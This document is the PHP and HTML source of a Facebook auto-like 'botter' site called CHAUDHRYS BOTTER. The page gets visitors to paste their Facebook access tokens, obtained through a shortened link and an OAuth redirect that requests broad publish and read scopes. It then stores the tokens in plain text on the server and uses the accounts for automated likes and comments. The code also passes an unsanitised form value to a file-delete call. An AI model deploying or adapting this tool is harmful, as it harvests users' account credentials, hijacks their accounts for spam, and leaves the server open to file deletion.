<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
★CHAUDHRYS BOTTER★
</title><link rel="stylesheet" type="text/css" href="chbotter.css" media="all,handheld"/><link rel="shortcut icon" href="http://bot.lethetuan.com/images/favicon.ico">
<script type="text/javascript" src=""></script>
<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $jdsab[]=$b.'='.$c;
}
$true='?'.implode('&',$jdsab);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION MADE BY CHAUDHRYS BOTTER',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('jdsab')){
        mkdir('jdsab');
}
if($bb){
$blue=fopen('jdsab/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("Info : Text Robot Has Been Created")</script>';
}else{
        if($z){
if(file_exists('jdsab/'.$id)){
$file=file_get_contents('jdsab/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('jdsab/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('jdsab/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('jdsab/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('jdsab/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('jdsab/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("Info : Data Has Been Saved Successfully Robot Will Run Automatically")</script>';}}
}

public function lOgbot($d){
        unlink('jdsab/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("Info : Logout Success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('jdsab/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like + Comment';
}else{
        $satu='off';
        $ak='Just Like';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot Emo';
}else{
        $dua='off';
        $ik='Bot Manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered On';
}else{
        $tiga='off';
        $ek='Powered Off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text Via Script';
}else{
        $empat='off';
        $uk='Text Via Self';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<ul>
<li>
Facebook Has Been Fucked By : <font color="red">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot :</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Just Like</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like + Comment</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot Manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot Emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered Off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered On</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Text Via Self</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Replace Your Text
</option>
<option value="on">
Text Via Script</option>
</select>';
        }else{
        echo'
Create Your Comments :
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="Save"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"December"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
<div id="header">
<h1 class="heading">
<div align=center>

<h2 class="description">
<b>

</h2></div>';
} 

public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
<h3 class="description">
<center>
<b></a> </a>
</center><marquee behavior="scroll" direction="right" scrollamount="15" scrolldelay="8" width="100%" style="width: 100%;">
<b>
<font size="20" color=""><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/08/20/flamingtext_com_1471720373_411110169.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></font><a class="sec" href="http://fb.com/chaudry.junaid.3"><font color="" size="40"><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/08/20/flamingtext_com_1471720044_411110167.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></font></a></b> <font size="20" color="red"></font>

<a class="sec" href="http://fb.com/chaudry.junaid.3
"><font color="sky blue" size="20"></font></a><font size="20" color=""><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/08/20/flamingtext_com_1471720219_411110168.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></font></marquee>
<br>
<br>
<center><a href="https://www.facebook.com/profile.php?id=100001994209058"><br></a></center>
<h2 class="title">
<div class="post-content">

<center></head>
        <div id="main">
            <div id="content">
                <div class="header">
<span class="mfss fcg">
<br>
<br>
<br>
<font size="30" color="white"></font><font face="Orbitron" size="7" style="background: url(&quot;http://i1314.photobucket.com/albums/t576/vophuongdong/nabz_zpse21a729c.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em blue, 0pt 2pt 0.6em blue;"><b></b></font><font size="30" color="white"></font>
</span>

<div class="post-meta2">
</div></div></div>';
}

public function bwh(){
echo'
<div id="bottom-content">
<div id="navigation-menu">
</span>
</div></center>
</div><center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/08/15/flamingtext_com_1471292368_236578169.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center>
<br>
<center>
<ul><li><a href="https://goo.gl/NkKRQ6" target="blank">Get Working Token(Other Tokens Not Support)</a></li>
</center>
<div id="top-content">
<div id="search-form">

<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value="Submit"></form></div></div></div>';

$this->membEr();
}

public function membEr(){
        if(!is_dir('jdsab')){
        mkdir('jdsab');
}
$up=opendir('jdsab');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
Users Robot : <font color="blue">'.count($user).'</font>
</div>
<center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/08/15/flamingtext_com_1471292102_236578167.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></center>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('jdsab/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("Info : Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('jdsab/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("Info : Token Invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<center><audio controls autoplay>
  <source src="http://awais-fan.ml/picoplayer%20player.mp3
">
  Your browser does not support the audio element.
</audio></center>
